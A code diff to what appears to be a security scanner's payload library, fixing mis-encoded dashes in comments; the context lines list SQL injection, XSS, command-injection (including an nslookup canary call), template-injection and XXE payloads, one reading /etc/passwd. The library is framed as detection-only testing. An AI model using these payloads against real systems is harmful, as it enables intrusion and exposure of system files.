@@ -1,7 +1,7 @@
 function v(kind, payload, whatItTests) {
     return { kind, payload, whatItTests };
 }
-/** SQL injection Ã¢â‚¬â€ tautologies, unions, time-based, stacked, encodings. */
+/** SQL injection — tautologies, unions, time-based, stacked, encodings. */
 export const SQLI_VARIANTS = [
     v("sqli", "' OR '1'='1", "classic tautology, single-quote context"),
     v("sqli", "' OR '1'='1' -- ", "tautology with line comment"),
@@ -32,7 +32,7 @@ export const SQLI_VARIANTS = [
     v("sqli", "'%09OR%09'1'='1", "tab-whitespace bypass"),
     v("sqli", "' AND CAST('a' AS INT)=1-- ", "error-based CAST probe (detection only)"),
 ];
-/** Cross-site scripting Ã¢â‚¬â€ contexts, event handlers, encoding bypasses. */
+/** Cross-site scripting — contexts, event handlers, encoding bypasses. */
 export const XSS_VARIANTS = [
     v("xss", "<script>alert(1)</script>", "classic script context"),
     v("xss", "<img src=x onerror=alert(1)>", "event-handler vector"),
@@ -63,7 +63,7 @@ export const XSS_VARIANTS = [
     v("xss", "<math><mi href=\"javascript:alert(1)\">x</mi></math>", "MathML namespace href vector"),
 ];
 /**
- * OS command injection Ã¢â‚¬â€ benign commands only (id/echo/sleep). The agent
+ * OS command injection — benign commands only (id/echo/sleep). The agent
  * substitutes its canary marker for VARIANT where a marker echo proves
  * execution. No destructive commands exist in this list.
  */
@@ -91,7 +91,7 @@ export const CMDI_VARIANTS = [
     v("cmdi", ";nslookup {{CANARY}}", "DNS canary out-of-band detection"),
     v("cmdi", "`echo VARIANT`", "backtick echo-canary substitution"),
 ];
-/** Server-side template injection Ã¢â‚¬â€ detection markers only, no sandbox escapes. */
+/** Server-side template injection — detection markers only, no sandbox escapes. */
 export const SSTI_VARIANTS = [
     v("ssti", "{{7*7}}", "Jinja2/Twig math detection"),
     v("ssti", "${7*7}", "Freemarker/Velocity detection"),
@@ -115,9 +115,9 @@ export const SSTI_VARIANTS = [
     v("ssti", "{{7*7", "unclosed-brace error-based context probe"),
 ];
 /**
- * XXE Ã¢â‚¬â€ detection shapes only. `{{CANARY}}` = operator canary host
+ * XXE — detection shapes only. `{{CANARY}}` = operator canary host
  * placeholder (agent substitutes). No billion-laughs / quadratic-blowup
- * shapes Ã¢â‚¬â€ those are DoS and excluded by policy.
+ * shapes — those are DoS and excluded by policy.
  */
 export const XXE_VARIANTS = [
     v("xxe", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>', "classic external entity, read-only file probe"),
